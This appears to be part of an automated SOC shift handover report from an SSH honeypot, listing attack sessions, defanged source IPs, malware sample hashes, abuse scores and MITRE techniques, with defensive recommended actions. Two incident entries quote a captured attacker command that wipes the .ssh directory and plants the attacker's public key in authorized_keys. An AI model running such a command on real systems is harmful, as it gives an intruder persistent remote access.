| `2026-05-21 12:23:16` | `cowrie.command.failed` |
| `2026-05-21 12:23:16` | `cowrie.log.closed` |
| `2026-05-21 12:23:16` | `cowrie.session.params` |
| `2026-05-21 12:23:16` | `cowrie.command.input` |
| `2026-05-21 12:23:17` | `cowrie.session.file_download` |
| `2026-05-21 12:23:17` | `cowrie.log.closed` |
| `2026-05-21 12:23:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79bcb8f794a2

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:23 |
| **Last Seen** | 2026-05-21 12:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:23:18` | `cowrie.session.connect` |
| `2026-05-21 12:23:18` | `cowrie.client.version` |
| `2026-05-21 12:23:18` | `cowrie.client.kex` |
| `2026-05-21 12:23:19` | `cowrie.login.success` |
| `2026-05-21 12:23:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6907f04b117

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:24 |
| **Last Seen** | 2026-05-21 12:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:24:32` | `cowrie.session.connect` |
| `2026-05-21 12:24:32` | `cowrie.client.version` |
| `2026-05-21 12:24:32` | `cowrie.client.kex` |
| `2026-05-21 12:24:32` | `cowrie.login.success` |
| `2026-05-21 12:24:33` | `cowrie.session.params` |
| `2026-05-21 12:24:33` | `cowrie.command.input` |
| `2026-05-21 12:24:33` | `cowrie.command.failed` |
| `2026-05-21 12:24:33` | `cowrie.log.closed` |
| `2026-05-21 12:24:33` | `cowrie.session.params` |
| `2026-05-21 12:24:33` | `cowrie.command.input` |
| `2026-05-21 12:24:33` | `cowrie.session.file_download` |
| `2026-05-21 12:24:33` | `cowrie.log.closed` |
| `2026-05-21 12:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f2c41193071

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:24 |
| **Last Seen** | 2026-05-21 12:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:24:35` | `cowrie.session.connect` |
| `2026-05-21 12:24:35` | `cowrie.client.version` |
| `2026-05-21 12:24:35` | `cowrie.client.kex` |
| `2026-05-21 12:24:35` | `cowrie.login.success` |
| `2026-05-21 12:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15047aee9ee7

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:27 |
| **Last Seen** | 2026-05-21 12:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:27:03` | `cowrie.session.connect` |
| `2026-05-21 12:27:03` | `cowrie.client.version` |
| `2026-05-21 12:27:03` | `cowrie.client.kex` |
| `2026-05-21 12:27:03` | `cowrie.login.success` |
| `2026-05-21 12:27:03` | `cowrie.session.params` |
| `2026-05-21 12:27:03` | `cowrie.command.input` |
| `2026-05-21 12:27:03` | `cowrie.command.failed` |
| `2026-05-21 12:27:04` | `cowrie.log.closed` |
| `2026-05-21 12:27:04` | `cowrie.session.params` |
| `2026-05-21 12:27:04` | `cowrie.command.input` |
| `2026-05-21 12:27:04` | `cowrie.session.file_download` |
| `2026-05-21 12:27:04` | `cowrie.log.closed` |
| `2026-05-21 12:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db1e2e3707bb

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:27 |
| **Last Seen** | 2026-05-21 12:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:27:06` | `cowrie.session.connect` |
| `2026-05-21 12:27:06` | `cowrie.client.version` |
| `2026-05-21 12:27:06` | `cowrie.client.kex` |
| `2026-05-21 12:27:06` | `cowrie.login.success` |
| `2026-05-21 12:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.36.117[.]234` | **31** | 2026-05-21 11:44 | 2026-05-21 12:27 | 0m | 31 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `109.104.211[.]92` | **24** | 2026-05-21 09:49 | 2026-05-21 10:01 | 48m | 0 | `T1592` | 🟠 MEDIUM |
| `102.88.137[.]80` | **20** | 2026-05-21 09:51 | 2026-05-21 10:03 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `5.182.83[.]231` | **7** | 2026-05-21 09:56 | 2026-05-21 10:06 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `79.36.191[.]212` | **7** | 2026-05-21 09:50 | 2026-05-21 09:57 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `207.180.229[.]239` | **6** | 2026-05-21 09:52 | 2026-05-21 09:57 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `41.216.178[.]69` | **5** | 2026-05-21 09:52 | 2026-05-21 09:58 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `103.143.238[.]100` | **4** | 2026-05-21 09:48 | 2026-05-21 09:49 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `157.245.56[.]194` | **3** | 2026-05-21 10:31 | 2026-05-21 12:08 | 1m | 0 | `T1592` | 🟢 LOW |
| `18.191.16[.]102` | **3** | 2026-05-21 10:25 | 2026-05-21 10:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `209.97.168[.]113` | **3** | 2026-05-21 09:49 | 2026-05-21 09:54 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `194.102.73[.]93` | **2** | 2026-05-21 11:37 | 2026-05-21 11:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | **2** | 2026-05-21 12:36 | 2026-05-21 12:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `43.108.59[.]249` | **2** | 2026-05-21 10:20 | 2026-05-21 10:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]208` | **2** | 2026-05-21 11:27 | 2026-05-21 11:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.123.111[.]89` | 1 | 2026-05-21 12:30 | 2026-05-21 12:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.118.189[.]3` | 1 | 2026-05-21 10:23 | 2026-05-21 10:23 | 30s | 0 | `T1592` | 🟢 LOW |
| `120.48.112[.]118` | 1 | 2026-05-21 09:50 | 2026-05-21 09:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.140.39[.]173` | 1 | 2026-05-21 11:24 | 2026-05-21 11:25 | 30s | 0 | `T1592` | 🟢 LOW |
| `193.180.208[.]5` | 1 | 2026-05-21 09:49 | 2026-05-21 09:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.244.11[.]170` | 1 | 2026-05-21 09:59 | 2026-05-21 09:59 | 41s | 0 | `T1592` | 🟢 LOW |
| `31.58.87[.]216` | 1 | 2026-05-21 09:55 | 2026-05-21 09:55 | 15s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `209.97.168[.]113` | SG | DigitalOcean, LLC | **100** ⚠️ | 7 |
| `43.108.59[.]249` | KR | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 1 |
| `66.132.172[.]208` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `102.88.137[.]80` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `20.244.11[.]170` | IN | Microsoft Corporation | **100** ⚠️ | 2 |
| `193.180.208[.]5` | DK | Webdock AS44803 | **100** ⚠️ | 1 |
| `194.102.73[.]93` | RO | Universitatea de Stiinte Agricole si Medicina Veterinara Cluj-Napoca | **100** ⚠️ | 0 |
| `157.245.56[.]194` | SG | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `103.143.238[.]100` | US | HONG KONG LING JIAN ZHUO TECHNOLOGY CO., LIMITED | **100** ⚠️ | 50 |
| `109.123.111[.]89` | GB | THG HOSTING LIMITED | **100** ⚠️ | 10 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 153 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 85 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 67 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 34 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 34 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 207 cases |
| Tool 34  | Credential Extractor        | ✅ 152 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (5.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 68 priority case(s) shown individually · 22 recon entry/entries in table (15 group(s) consolidating 121 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-21T12:47:42Z_
